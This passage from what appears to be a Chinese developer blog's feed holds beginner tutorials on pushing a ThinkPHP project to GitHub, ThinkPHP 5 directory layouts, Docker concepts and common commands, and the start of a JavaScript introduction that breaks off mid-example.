master</code></li></ul></blockquote><ol><li>建立好远程仓库，注意需要有README.md文件；</li><li>关联本地和远程仓库：<code>git remote add origin git@github.com:Directoree/thinkphp5.git</code></li><li>将远程README.md文件拉到本地仓库来，<code>git pull --rebase origin master</code></li><li>将本地文件部署到远程仓库：<code>git push -u origin master</code></li></ol><p>完成(●’◡’●)</p><div class="article-img"><p><img src="https://i.loli.net/2019/04/02/5ca2469255478.png" alt="github.png" data-zoomable><br><img src="https://i.loli.net/2019/04/02/5ca247588b094.png" alt="github2.png" data-zoomable><br><img src="https://i.loli.net/2019/04/02/5ca2479b7ab9a.png" alt="github3.png" data-zoomable></p></div><br><h3 id="三-ThinkPHP5-0和ThinkPHP5-1的文件结构"><font color="#FF6347" face="Comic sans MS">三. ThinkPHP5.0和ThinkPHP5.1的文件结构</font><a href="post/docker-github#三-ThinkPHP5-0和ThinkPHP5-1的文件结构"></a></h3><p><strong>目录结构</strong><br>初始的目录结构有些不一样如下：</p><p><strong>1. thinphp5.0结构</strong></p><pre class="line-numbers language-php"><code class="language-php">project  应用部署目录├─application           应用目录（可设置）│  ├─common             公共模块目录（可更改）│  ├─index              模块目录<span class="token punctuation">(</span>可更改<span class="token punctuation">)</span>│  │  ├─config<span class="token punctuation">.</span>php      模块配置文件│  │  ├─common<span class="token punctuation">.</span>php      模块函数文件│  │  ├─controller      控制器目录│  │  ├─model           模型目录│  │  ├─view            视图目录│  │  └─ <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            更多类库目录│  ├─command<span class="token punctuation">.</span>php        命令行工具配置文件│  ├─common<span class="token punctuation">.</span>php         应用公共（函数）文件│  ├─config<span class="token punctuation">.</span>php         应用（公共）配置文件│  ├─database<span class="token punctuation">.</span>php       数据库配置文件│  ├─tags<span class="token punctuation">.</span>php           应用行为扩展定义文件│  └─route<span class="token punctuation">.</span>php          路由配置文件├─extend                扩展类库目录（可定义）├─<span class="token keyword">public</span>                <span class="token constant">WEB</span> 部署目录（对外访问目录）│  ├─<span class="token keyword">static</span>             静态资源存放目录<span class="token punctuation">(</span>css<span class="token punctuation">,</span>js<span class="token punctuation">,</span>image<span class="token punctuation">)</span>│  ├─index<span class="token punctuation">.</span>php          应用入口文件│  ├─router<span class="token punctuation">.</span>php         快速测试文件│  └─<span class="token punctuation">.</span>htaccess          用于 apache 的重写├─runtime               应用的运行时目录（可写，可设置）├─vendor                第三方类库目录（Composer）├─thinkphp              框架系统目录│  ├─lang               语言包目录│  ├─library            框架核心类库目录│  │  ├─think           Think 类库包目录│  │  └─traits          系统 Traits 目录│  ├─tpl                系统模板目录│  ├─<span class="token punctuation">.</span>htaccess          用于 apache 的重写│  ├─<span class="token punctuation">.</span>travis<span class="token punctuation">.</span>yml        <span class="token constant">CI</span> 定义文件│  ├─base<span class="token punctuation">.</span>php           基础定义文件│  ├─composer<span class="token punctuation">.</span>json      composer 定义文件│  ├─console<span class="token punctuation">.</span>php        控制台入口文件│  ├─convention<span class="token punctuation">.</span>php     惯例配置文件│  ├─helper<span class="token punctuation">.</span>php         助手函数文件（可选）│  ├─<span class="token constant">LICENSE</span><span class="token punctuation">.</span>txt        授权说明文件│  ├─phpunit<span class="token punctuation">.</span>xml        单元测试配置文件│  ├─<span class="token constant">README</span><span class="token punctuation">.</span>md          <span class="token constant">README</span> 文件│  └─start<span class="token punctuation">.</span>php          框架引导文件├─build<span class="token punctuation">.</span>php             自动生成定义文件（参考）├─composer<span class="token punctuation">.</span>json         composer 定义文件├─<span class="token constant">LICENSE</span><span class="token punctuation">.</span>txt           授权说明文件├─<span class="token constant">README</span><span class="token punctuation">.</span>md             <span class="token constant">README</span> 文件├─think                 命令行入口文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>2. thinphp5.1结构</strong></p><pre class="line-numbers language-php"><code class="language-php">├─application           应用目录│  ├─common             公共模块目录（可以更改）│  ├─module_name        模块目录│  │  ├─config<span class="token punctuation">.</span>php      模块配置文件│  │  ├─common<span class="token punctuation">.</span>php      模块函数文件│  │  ├─controller      控制器目录│  │  ├─model           模型目录│  │  ├─view            视图目录│  │  └─ <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            更多类库目录│  ││  ├─command<span class="token punctuation">.</span>php        命令行工具配置文件│  ├─common<span class="token punctuation">.</span>php         公共函数文件│  ├─config<span class="token punctuation">.</span>php         公共配置文件│  ├─route<span class="token punctuation">.</span>php          路由配置文件│  ├─tags<span class="token punctuation">.</span>php           应用行为扩展定义文件│  └─database<span class="token punctuation">.</span>php       数据库配置文件│├─<span class="token keyword">public</span>                <span class="token constant">WEB</span>目录（对外访问目录）│  ├─index<span class="token punctuation">.</span>php          入口文件│  ├─router<span class="token punctuation">.</span>php         快速测试文件│  └─<span class="token punctuation">.</span>htaccess          用于apache的重写│├─thinkphp              框架系统目录│  ├─lang               语言文件目录│  ├─library            框架类库目录│  │  ├─think           Think类库包目录│  │  └─traits          系统<span class="token keyword">Trait</span>目录│  ││  ├─tpl                系统模板目录│  ├─base<span class="token punctuation">.</span>php           基础定义文件│  ├─console<span class="token punctuation">.</span>php        控制台入口文件│  ├─convention<span class="token punctuation">.</span>php     框架惯例配置文件│  ├─helper<span class="token punctuation">.</span>php         助手函数文件│  ├─phpunit<span class="token punctuation">.</span>xml        phpunit配置文件│  └─start<span class="token punctuation">.</span>php          框架入口文件│├─extend                扩展类库目录├─runtime               应用的运行时目录（可写，可定制）├─vendor                第三方类库目录（Composer依赖库）├─build<span class="token punctuation">.</span>php             自动生成定义文件（参考）├─composer<span class="token punctuation">.</span>json         composer 定义文件├─<span class="token constant">LICENSE</span><span class="token punctuation">.</span>txt           授权说明文件├─<span class="token constant">README</span><span class="token punctuation">.</span>md             <span class="token constant">README</span> 文件├─think                 命令行入口文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>router.php用于php自带webserver支持，可用于快速测试 切换到public目录后，启动命令：php -S localhost:8888 router.php 上面的目录结构和名称是可以改变的，这取决于你的入口文件和配置参数。</p></blockquote><p><strong>命名规范</strong></p><div class="article-img"><p><img src="https://i.loli.net/2019/04/02/5ca3000abedca.png" alt="3.png" data-zoomable></p></div>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/post/docker/"/>
      <url>/post/docker/</url>
      
        <content type="html"><![CDATA[<p>项目需要，我也来学学Docker和ThinkPHP5…<br>学习需要时间和精力，早开始早熟练…..(｡◕︎‿◕︎)ﾉﾟ･ﾟ･</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">Docker</font> </center><br><br><h3 id="一-Docker初识"><font color="#FF6347" face="Comic sans MS">一. Docker初识</font><a href="post/docker#一-Docker初识"></a></h3><br><blockquote><p><font color="#FF7F00"><strong>关于Docker</strong></font></p><ol><li>为什么要使用Docker？</li><li>Docker和虚拟机(virtual machine)有什么区别？</li><li>什么是Docker？</li></ol></blockquote><br><p><strong>一、 为什么要使用Docker？</strong></p><p><strong>环境配置的难题</strong></p><p>软件开发最大的麻烦事之一，就是环境配置。用户计算机的环境都不相同，你怎么知道自家的软件，能在那些机器跑起来？</p><p>用户必须保证两件事：操作系统的设置，各种库和组件的安装。只有它们都正确，软件才能运行。举例来说，安装一个 Python 应用，计算机必须有 Python 引擎，还必须有各种依赖，可能还要配置环境变量。</p><p>如果某些老旧的模块与当前环境不兼容，那就麻烦了。开发者常常会说：“它在我的机器可以跑了”（It works on my machine），言下之意就是，其他机器很可能跑不了。</p><p>环境配置如此麻烦，换一台机器，就要重来一次，旷日费时。很多人想到，能不能从根本上解决问题，软件可以带环境安装？也就是说，安装的时候，把原始环境一模一样地复制过来。</p><br><p><strong>二、 Docker和虚拟机(virtual machine)有什么区别？</strong></p><p><strong>1. 虚拟机</strong></p><p>虚拟机（virtual machine）就是带环境安装的一种解决方案。它可以在一种操作系统里面运行另一种操作系统，比如在 Windows 系统里面运行 Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。<br>虽然用户可以通过虚拟机还原软件的原始环境。但是，这个方案有几个缺点。</p><p><strong>（1）资源占用多</strong></p><p>虚拟机会独占一部分内存和硬盘空间。它运行的时候，其他程序就不能使用这些资源了。哪怕虚拟机里面的应用程序，真正使用的内存只有 1MB，虚拟机依然需要几百 MB 的内存才能运行。</p><p><strong>（2）冗余步骤多</strong></p><p>虚拟机是完整的操作系统，一些系统级别的操作步骤，往往无法跳过，比如用户登录。</p><p><strong>（3）启动慢</strong></p><p>启动操作系统需要多久，启动虚拟机就需要多久。可能要等几分钟，应用程序才能真正运行。</p><br><p><strong>2. Linux 容器</strong></p><p>由于虚拟机存在这些缺点，Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。<br>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个保护层。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与底层系统的隔离。<br>由于容器是进程级别的，相比虚拟机有很多优势。</p><p><strong>（1）启动快</strong></p><p>容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。</p><p><strong>（2）资源占用少</strong></p><p>容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。</p><p><strong>（3）体积小</strong></p><p>容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件要小很多。<br>总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多。</p><br><p><strong>三、 什么是Docker？</strong></p><p>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p><p>Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。</p><p>总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。</p><br><p><strong>四、Docker 的用途</strong></p><p>Docker 的主要用途，目前有三大类。</p><p>（1）提供一次性的环境。比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。<br>（2）提供弹性的云服务。因为 Docker 容器可以随开随关，很适合动态扩容和缩容。<br>（3）组建微服务架构。通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><br><h3 id="二-Docker架构"><font color="#FF6347" face="Comic sans MS">二. Docker架构</font><a href="post/docker#二-Docker架构"></a></h3><br><div class="article-img"><p><img src="https://i.loli.net/2019/03/25/5c98a0633af86.png" alt="docker-architecture.png" data-zoomable></p></div><p><font color="#FF7F00"><strong>Docker是CS架构，Docker 的核心组件包括：</strong></font></p><ol><li><p><strong>Docker客户端 （Client）：</strong>通过docker在host上构建和运行容器</p></li><li><p><strong>Docker服务器（Docker daemon）：</strong>是服务器组件，以 Linux 后台服务的方式运行。 运行在宿主机上，Docker守护进程，用户通过Docker client(Docker命令CLI)与Docker daemon交互。</p></li><li><p><strong>Docker镜像 （Image）：</strong>通过它可以创建 Docker 容器。镜像是只读的，镜像中包含有需要运行的文件。镜像用来创建container，一个镜像可以运行多个container；<font color="#FF7F00"><strong>镜像可以通过Dockerfile创建，也可以从Docker hub/registry上下载</strong></font>。</p></li><li><p><strong>Docker容器（Container）：</strong>容器是Docker的运行组件，启动一个镜像就是一个容器，容器是一个隔离环境，多个容器之间不会相互影响，保证容器中的程序运行在一个相对安全的环境中。</p></li><li><p><strong>Docker hub/Registry：</strong>注册服务器，用于<font color="#FF7F00"><strong>管理多个镜像仓库（Repository）</strong></font>，起到的是服务器的作用。</p></li><li><p><strong>Repository：</strong>镜像仓库，用于存储具体的docker镜像，起到的是仓库存储作用。</p></li></ol><br><p><strong>Registry和Repository的关系：</strong></p><div class="article-img"><p><img src="https://i.loli.net/2019/03/25/5c98a4fc5fc7e.png" alt="docker1.png" data-zoomable></p></div><br><p><strong>架构扩充知识：</strong></p><div class="article-img"><p><img src="https://i.loli.net/2019/03/25/5c98a77024a1a.png" alt="2.png" data-zoomable></p></div><br><p>最核心的是 Docker Daemon我们称之为Docker守护进程，也就是Server端，Server端可以部署在远程，也可以部署在本地，因为Server端与客户端(Docker Client)是通过Rest API进行通信。</p><p>docker CLI 实现容器和镜像的管理，为用户提供统一的操作界面,这个 客户端提供一个只读的镜像，然后通过镜像可以创建一个或者多个容器(container)，这些容器可以只是一个RFS(Root File System),也可以是一个包含了用户应用的RFS。容器在docker Client中只是一个进程，两个进程是互不可见的。</p><p>用户不能与server直接交互，但可以通过与容器这个桥梁来交互，由于是操作系统级别的虚拟技术，中间的损耗几乎可以不计</p><blockquote><p><font color="#FF7F00"><strong>CLI：</strong></font>command line interface 命令行接口.<br><font color="#FF7F00"><strong>RFS：</strong></font>Root File System 根文件系统.</p></blockquote><br><h3 id="三-Docker常用命令"><font color="#FF6347" face="Comic sans MS">三.  Docker常用命令</font><a href="post/docker#三-Docker常用命令"></a></h3><br><h4 id="3-1-镜像管理"><font color="#3CB371" face="Comic sans MS">3.1 镜像管理</font><a href="post/docker#3-1-镜像管理"></a></h4><pre class="line-numbers language-html"><code class="language-html">docker images                 ------ 列出本地所有镜像docker search &lt;IMAGE_ID/NAME> ------ 查找imagedocker pull <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMAGE_ID</span><span class="token punctuation">></span></span>        ------ 下载imagedocker push <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMAGE_ID</span><span class="token punctuation">></span></span>        ------ 上传imagedocker rmi <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMAGE_ID</span><span class="token punctuation">></span></span>         ------ 删除image<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="3-2-容器管理"><font color="#3CB371" face="Comic sans MS">3.2 容器管理</font><a href="post/docker#3-2-容器管理"></a></h4><pre class="line-numbers language-html"><code class="language-html">docker run -i -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IMAGE_ID</span><span class="token punctuation">></span></span> /bin/bash-i            ------ 标准输入给容器    -t            ------ 分配一个虚拟终端   /bin/bash     ------ 执行bash脚本-d            ------ 以守护进程方式运行（后台）-P            ------ 默认匹配docker容器的5000端口号到宿主机的49153 to 65535端口-p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HOT_PORT</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_PORT</span><span class="token punctuation">></span></span>              ------ 指定端口号,前者为映射端口，后者为容器端口--name        ------ 指定容器的名称，方便区别--rm          ------ 退出时删除容器--------------------------------------------------------------------------------docker stop <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>                ------ 等待运行结束并停止containerdocker kill <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>                ------ 强制停止containerdocker start <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span> -i /bin/bash              ------ 重新启动container       --------------------------------------------------------------------------------         docker ps     ------ 显示正在运行过的容器-l            ------ 显示最后启动的容器-a            ------ 显示所有容器--------------------------------------------------------------------------------docker attach <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span> ------ 连接到启动的容器docker logs <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>   ------ 输出容器日志-f                           ------ 实时输出docker cp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>:path hostpath                             ------ 复制容器内的文件到宿主机目录上docker rm <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>     ------ 删除containerdocker rm `docker ps -a -q`  ------ 删除所有容器docker kill `docker ps -q`docker rmi `docker images -q -a`docker wait <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>   ------ 阻塞对容器的其他调用方法，直到容器停止后退出docker top <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>    ------ 查看容器中运行的进程docker diff <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>   ------ 查看容器中的变化docker inspect <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span> ------ 查看容器详细信息（输出为Json）-f：查找特定信息，如    docker inspect -f '{{ .NetworkSettings.IPAddress }}'    docker commit -m "comment" -a "author" <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span>  ouruser/imagename:tag--------------------------------------------------------------------------------docker extc -it <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>COMMAND</span><span class="token punctuation">></span></span>                             ------ 在容器里执行命令，并输出结果docker exec -i -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span> /bin/bash                             ------ 重新进入守护式进程            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="3-3-网络管理"><font color="#3CB371" face="Comic sans MS">3.3 网络管理</font><a href="post/docker#3-3-网络管理"></a></h4><pre class="line-numbers language-html"><code class="language-html">docker run -P                         ------ 随机分配端口号docker run -p 2560:5000               ------ 绑定特定端口号（主机的所有网络接口的2560端口均绑定容器的5000端口）docker run -p 127.0.0.1:5000:5000     ------ 绑定主机的特定接口的端口号docker run -d -p 127.0.0.1:5000:5000/udp training/webapp python app.py                                      ------ 绑定udp端口号docker port <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_ID</span><span class="token punctuation">></span></span> 5000       ------ 查看容器的5000端口对应本地机器的IP和端口号--------------------------------------------------------------------------------使用Docker Linking连接容器：Docker为源容器和接收容器创建一个安全的通道，容器之间不需要暴露端口，接收的容器可以访问源容器的数据docker run -d -P --name <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_NAME</span><span class="token punctuation">></span></span> --link <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CONTAINER_NAME_TO_LINK</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ALIAS</span><span class="token punctuation">></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="3-4-数据管理"><font color="#3CB371" face="Comic sans MS">3.4 数据管理</font><a href="post/docker#3-4-数据管理"></a></h4><p>Data Volumes：volume是在一个或多个容器里指定的特殊目录</p><ul><li>数据卷可以在容器间共享和重复使用</li><li>可以直接修改容器卷的数据</li><li>容器卷里的数据不会被包含到镜像中</li><li>容器卷保持到没有容器再使用它</li></ul><p>a. 可以在容器启动的时候添加<code>-v</code>参数指定容器卷，也可以在Dockerfile里用VOLUMN命令添加<br><strong><code>docker run -d -P --name web -v /webapp training/webapp python app.py</code></strong></p><p>b. 也可以将容器卷挂载到宿主机目录或宿主机的文件上，<code>&lt;容器目录或文件&gt;</code>的内容会被替换为<code>&lt;宿主机目录或文件&gt;</code>的内容，默认容器对这个目录有可读写权限<br><strong><code>docker run -d -P --name web -v &lt;宿主机目录&gt;:&lt;容器目录&gt; training/webapp python app.py</code></strong></p><p>c. 可以通过指定<code>ro</code>，将权限改为只读<br><strong><code>docker run -d -P --name web -v &lt;宿主机目录&gt;:&lt;容器目录&gt;:ro training/webapp python app.py</code></strong></p><p>d. 在一个容器创建容器卷后，其他容器便可以通过<code>--volumes-from</code>共享这个容器卷数据，如下：<br><strong><code>docker run -d -v /dbdata --name db1 training/postgres echo Data-only container for postgres</code></strong><br>首先启动了一个容器，并为这个容器增加一个数据卷<code>/dbdata</code>，然后启动另一个容器，共享这个数据卷</p><p>e. <strong><code>docker run -d --volumes-from db1 --name db2 training/postgres</code></strong><br>此时db2使用了db1的容器卷，当容器db1被删除时，容器卷也不会被删除，只有所有容器不再使用此容器卷时，才会被删除<br><code>docker rm -v</code> ：删除容器卷</p><p>f. 除了共享数据外，容器卷另一个作用是用来备份、恢复和迁移数据<br><strong><code>docker run --volumes-from db1 -v /home/backup:/backup ubuntu tar cvf /backup/backup.tar /dbdata</code></strong></p><p>g. 启动一个容器数据卷使用db1容器的数据卷，同时新建立一个数据卷指向宿主机目录<code>/home/backup</code>，将<code>/dbdata</code>目录的数据压缩为<code>/backup/backup.tar</code></p><p>h. <strong><code>docker run -v /dbdata --name dbdata2 ubuntu /bin/bash</code></strong><br><strong><code>docker run --volumes-from dbdata2 -v /home/backup:/backup busybox tar xvf /backup/backup.tar</code></strong><br>启动一个容器，同时把<code>backup.tar</code>的内容解压到容器的 <code>backup</code></p><br><p><strong>仓库管理</strong></p><p>docker login ：登录</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript</title>
      <link href="/post/JavaScript/"/>
      <url>/post/JavaScript/</url>
      
        <content type="html"><![CDATA[<p>JavaScript 语句和 JavaScript 变量都对大小写敏感。( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">JavaScript 基础</font> </center><br><br><h3 id="一-JavaScript-简介"><font color="#FF6347" face="Comic sans MS">一. JavaScript 简介</font><a href="post/JavaScript#一-JavaScript-简介"></a></h3><br><h4 id="1-1-JavaScript-由来"><font color="#3CB371" face="Comic sans MS">1.1 JavaScript 由来</font><a href="post/JavaScript#1-1-JavaScript-由来"></a></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） 关于JavaScript</strong></font></p><p>在上个世纪的1995年，当时的网景公司正凭借其Navigator浏览器成为Web时代开启时最著名的第一代互联网公司。</p><p>由于网景公司希望能在静态HTML页面上添加一些动态效果，于是叫Brendan Eich这哥们在两周之内设计出了JavaScript语言。你没看错，这哥们只用了10天时间。</p><p>为什么起名叫JavaScript？原因是当时Java语言非常红火，所以网景公司希望借Java的名气来推广，但事实上JavaScript除了语法上有点像Java，其他部分基本上没啥关系。</p><br><p><strong>ECMAScript</strong></p><p>因为网景开发了JavaScript，一年后微软又模仿JavaScript开发了JScript，为了让JavaScript成为全球标准，几个公司联合ECMA（European Computer Manufacturers Association）组织定制了JavaScript语言的标准，被称为ECMAScript标准。</p><p>所以简单说来就是，ECMAScript是一种语言标准，而JavaScript是网景公司对ECMAScript标准的一种实现。</p><p>那为什么不直接把JavaScript定为标准呢？因为JavaScript是网景的注册商标。</p><p>不过大多数时候，我们还是用JavaScript这个词。如果你遇到ECMAScript这个词，简单把它替换为JavaScript就行了。</p><br><p><strong>JavaScript版本</strong></p><p>JavaScript语言是在10天时间内设计出来的，虽然语言的设计者水平非常NB，但谁也架不住“时间紧，任务重”，所以，JavaScript有很多设计缺陷，我们后面会慢慢讲到。</p><p>此外，由于JavaScript的标准——ECMAScript在不断发展，最新版ECMAScript 6标准（简称ES6）已经在2015年6月正式发布了，所以，讲到JavaScript的版本，实际上就是说它实现了ECMAScript标准的哪个版本。</p><p>由于浏览器在发布时就确定了JavaScript的版本，加上很多用户还在使用IE6这种古老的浏览器，这就导致你在写JavaScript的时候，要照顾一下老用户，不能一上来就用最新的ES6标准写，否则，老用户的浏览器是无法运行新版本的JavaScript代码的。</p><br><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） JavaScript是什么？</strong></font></p><ul><li><p>JavaScript是一种小型的、轻量级的、面向对象的、跨平台的客户端脚本语言。</p></li><li><p>JavaScript是嵌入到浏览器软件当中的去的，只要你的电脑有浏览器就可以执行JS程序了。JavaScript是一种面向对象的程序语言。在程序中，对象是由“属性”和“方法”构成。</p></li><li><p><strong>跨平台：</strong>JS程序可以在多种平台下运行，如：windows、linux、mac、IOS等。</p></li><li><p><strong>客户端脚本程序：</strong>JS只能在客户端的浏览器来运行，不能在服务器端来运行。</p></li><li><p><strong>浏览器是一个翻译器</strong>，可以翻译三种代码：HTML代码、CSS代码、JavaScript代码。</p></li><li><p>JavaScript 是可插入 HTML 页面的编程代码。</p></li></ul><p><strong>注：JS中的对象只要会用就可以了，不需要我们自己去开发对象。</strong></p><br><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） JavaScript能干什么？</strong></font></p><ul><li><p><strong>表单验证：</strong>是JS最基本的功能。</p></li><li><p><strong>动态HTML：</strong>可以实现一些动态的、重复的效果。</p></li><li><p><strong>交互式：</strong>人机交互，通过键盘或鼠标，与网页中的元素进行交互。</p></li></ul><br><br><h4 id="1-2-JavaScript-规则"><font color="#3CB371" face="Comic sans MS">1.2 JavaScript 规则</font><a href="post/JavaScript#1-2-JavaScript-规则"></a></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） JavaScript用法</strong></font></p><ul><li><p>同一个网页中，可以有HTML代码、CSS代码、JavaScript代码。</p></li><li><p>通过<strong><code>&lt;script&gt;&lt;/script&gt;</code></strong>来引入JS程序代码。即HTML 中的脚本必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 会告诉 JavaScript 在何处开始和结束。</p></li></ul><br><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） 脚本的放置位置</strong></font></p><p>脚本可被放置在：</p><ol><li>放在HTML页面的<code>&lt;head&gt;&lt;/head&gt;</code> 里；</li><li>放在HTML页面的 <code>&lt;body&gt;&lt;/body&gt;</code> 里；或者同时放在二者中；</li><li>放在外部 .js文件里，这个文件里面直接写js脚本，不用再写<code>&lt;script&gt;&lt;/script&gt;</code>这两个标签。</li></ol><br><p><strong>a. 把 JavaScript 代码放在<code>&lt;head&gt;&lt;/head&gt;</code> 和放在 <code>&lt;body&gt;&lt;/body&gt;</code> 里的区别：</strong></p><ul><li>简单地说，放在 <code>&lt;head&gt;&lt;/head&gt;</code> 里的会比放在 <code>&lt;body&gt;&lt;/body&gt;</code> 先执行。head 标签里的代码会在页面还未开始绘制之前被解析，而在 body 里的代码则会在页面渲染的同时在读取到这段代码的时候才被执行。</li><li>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</li></ul><br><p><strong>b. 外部的 JavaScript</strong></p><ul><li>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</li><li>外部 JavaScript 文件的文件扩展名是 .js。</li><li>如需使用外部文件，请在 <code>&lt;script&gt;</code> 标签的 “src” 属性中设置该 .js 文件：</li><li>可以将脚本放置于 <code>&lt;head&gt;</code> 或者 <code>&lt;body&gt;</code>中，放在 <code>&lt;script&gt;</code> 标签中的脚本与外部引用的脚本运行效果完全一致。</li></ul><p>实例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>myScript.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token 